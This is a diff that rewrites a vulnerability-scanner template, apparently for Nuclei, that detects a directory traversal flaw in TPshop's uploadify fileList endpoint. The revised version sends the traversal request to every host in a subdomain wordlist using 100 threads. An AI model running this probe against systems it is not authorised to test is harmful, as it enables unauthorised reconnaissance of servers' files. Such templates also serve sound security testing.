@@ -1,16 +1,32 @@
 id: tpshop-directory-traversal
 
 info:
-    name: Tpshop Directory Traversal
-    author: 清风明月(www.secbook.info)
-    severity: high
+  name: TPshop Directory Traversal
+  author: pikpikcu
+  severity: high
+  reference: https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA
+  tags: tpshop,lfi
 
-rules:
-    r0:
-        request:
-            method: GET
-            path: /index.php/Home/uploadify/fileList?type=.+&path=../
-            headers:
-                Accept-Encoding: deflate
-        expression: response.status == 200 && response.body.bcontains(bytes(string("\"state\":\"SUCCESS\""))) && response.body.bcontains(bytes(string("total")))
-expression: r0()
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
+      - |
+        GET /index.php/Home/uploadify/fileList?type=.+&path=../../../ HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        words:
+          - '"state":"SUCCESS"'
+
+      - type: status
+        status:
+          - 200
